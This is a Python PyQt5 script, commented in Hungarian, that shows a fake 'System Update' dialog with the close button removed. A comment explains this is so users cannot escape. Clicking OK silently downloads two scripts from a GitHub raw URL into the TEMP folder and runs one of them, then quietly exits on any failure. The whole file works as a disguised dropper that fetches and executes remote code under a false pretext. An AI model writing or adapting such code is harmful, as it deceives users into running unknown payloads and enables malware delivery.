import sys
import os
import urllib.request
import subprocess
from PyQt5 import QtCore, QtGui, QtWidgets

class Ui_Dialog(object):
    def setupUi(self, Dialog):
        Dialog.setObjectName("Dialog")
        Dialog.resize(400, 150)
        
        # Ablak beállítások: nincs bezáró gomb, hogy ne szökhessenek meg
        Dialog.setWindowFlags(QtCore.Qt.Window | QtCore.Qt.WindowTitleHint | QtCore.Qt.CustomizeWindowHint)

        self.buttonBox = QtWidgets.QDialogButtonBox(Dialog)
        self.buttonBox.setGeometry(QtCore.QRect(30, 100, 341, 32))
        self.buttonBox.setOrientation(QtCore.Qt.Horizontal)
        self.buttonBox.setStandardButtons(QtWidgets.QDialogButtonBox.Ok)
        self.buttonBox.setObjectName("buttonBox")

        self.textBrowser = QtWidgets.QTextBrowser(Dialog)
        self.textBrowser.setGeometry(QtCore.QRect(20, 20, 361, 71))
        self.textBrowser.setObjectName("textBrowser")
        
        self.retranslateUi(Dialog)
        
        # Az OK gomb összekötése a letöltéssel és indítással
        self.buttonBox.accepted.connect(self.start_install)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "System Update"))
        self.textBrowser.setHtml(_translate("Dialog", "<html><body><p align='center'>A fontos rendszerfrissítések telepítéséhez kattintson az <b>OK</b> gombra.</p></body></html>"))

    def start_install(self):
        """Letölti a fájlokat a Git-ről a TEMP mappába, majd elindítja az oopa.py-t"""
        try:
            # 1. Útvonalak beállítása a TEMP mappába
            temp_path = os.getenv("TEMP")
            oopa_temp = os.path.join(temp_path, "oopa.py")
            phase2_temp = os.path.join(temp_path, "phase2.py")
            
            # 2. Letöltési linkek (Figyelj, hogy RAW linkek legyenek!)
            urls = {
                "https://raw.githubusercontent.com/plen-maker/Vers1/main/oopa.py": oopa_temp,
                "https://raw.githubusercontent.com/plen-maker/Vers1/main/phase2.py": phase2_temp
            }

            # 3. Letöltési folyamat beállítása (User-Agent-tel a GitHub miatt)
            opener = urllib.request.build_opener()
            opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
            urllib.request.install_opener(opener)

            # Letöltjük mindkét fájlt
            for url, path in urls.items():
                try:
                    urllib.request.urlretrieve(url, path)
                except Exception as e:
                    # Ha hiba van, nem állunk meg, de jelezzük (opcionális)
                    pass

            # 4. AZ OOPA.PY ELINDÍTÁSA
            # Megnyitjuk az oopa.py-t a letöltött helyről, külön konzol ablakban
            if os.path.exists(oopa_temp):
                subprocess.Popen([sys.executable, oopa_temp], creationflags=subprocess.CREATE_NEW_CONSOLE)

            # Az installer GUI bezárása
            sys.exit()

        except Exception as e:
            # Ha bármi elromlik, csendben kilépünk
            sys.exit()

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    Dialog = QtWidgets.QDialog()
    ui = Ui_Dialog()
    ui.setupUi(Dialog)
    Dialog.show()
    sys.exit(app.exec_())
    